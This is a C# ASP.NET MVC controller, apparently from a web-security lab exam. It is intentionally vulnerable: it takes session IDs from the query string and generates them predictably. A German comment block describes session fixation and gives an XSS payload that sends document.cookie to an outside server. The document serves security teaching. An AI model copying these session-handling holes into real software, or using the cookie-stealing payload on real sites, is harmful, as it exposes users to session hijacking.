using System;
using System.Collections.Generic;
using System.IO;
using System.Collections;
using System.Web.Mvc;
using System.Linq;
using System.Web;
using System.Security.Cryptography;
using System.Text;
using System.Data.SqlClient;
using Pruefung_Praktisch_Musterloesung.Models;

namespace Pruefung_Praktisch_Musterloesung.Controllers
{
    public class Lab2Controller : Controller
    {

        /**
        * 
        * ANTWORTEN BITTE HIER
        * 
        * Aufgabe 1.
        *   Session Fixation: Ich kann mittels dem "sid"-Paramater den Link jemand anderem den Link zusenden, diesen Einloggen lassen
        *   und so die Session übernehmen bzw. die privaten Daten sehen
        *   http://localhost:50374/Lab2/Index?sid=8c5324635a7c2899d6e0710cc7a3b4bda602889d
        *   
        *   Cookie mit Javascript abgreifen:
        *   Da die Session-ID in der View direkt in die Form geschrieben wird könnte man die Form aushebeln und eine XSS-Attacke machen.
        *   Das würde in etwas so funktionieren.
        *   http://localhost:50374/Lab2/Login?sid="<script>$.get("http://myserver.com/xd.php?=" + document.cookie)</script>
        *   Somit könnte der Angreifer die Sessionn des anderen übernehmen
        *   
        * 
        * */

        public ActionResult Index() {

            var sessionid = Request.QueryString["sid"];

            if (string.IsNullOrEmpty(sessionid))
            {
                var hash = (new SHA1Managed()).ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToString()));
                sessionid = string.Join("", hash.Select(b => b.ToString("x2")).ToArray());
            }

            ViewBag.sessionid = sessionid;

            return View();
        }

        [HttpPost]
        public ActionResult Login()
        {
            var username = Request["username"];
            var password = Request["password"];
            var sessionid = Request.QueryString["sid"];

            Lab2Userlogin model = new Lab2Userlogin();

            if (model.checkCredentials(username, password, Request.UserHostAddress, Request.Browser.Platform))
            {
                model.storeSessionInfos(username, password, sessionid, Request.UserHostAddress, Request.Browser.Platform);

                HttpCookie c = new HttpCookie("sid");
                c.Expires = DateTime.Now.AddMonths(2);
                c.Value = sessionid;
                Response.Cookies.Add(c);

                return RedirectToAction("Backend", "Lab2");
            }
            else
            {
                ViewBag.message = "Wrong Credentials";
                return View();
            }
        }

        public ActionResult Backend()
        {
            var sessionid = "";

            if (Request.Cookies.AllKeys.Contains("sid"))
            {
                sessionid = Request.Cookies["sid"].Value.ToString();
            }           

            if (!string.IsNullOrEmpty(Request.QueryString["sid"]))
            {
                sessionid = Request.QueryString["sid"];
            }
            
            // hints:
            //var used_browser = Request.Browser.Platform;
            //var ip = Request.UserHostAddress;

            Lab2Userlogin model = new Lab2Userlogin();

            if (model.checkSessionInfos(sessionid))
            {
                return View();
            }
            else
            {
                return RedirectToAction("Index", "Lab2");
            }              
        }
    }
}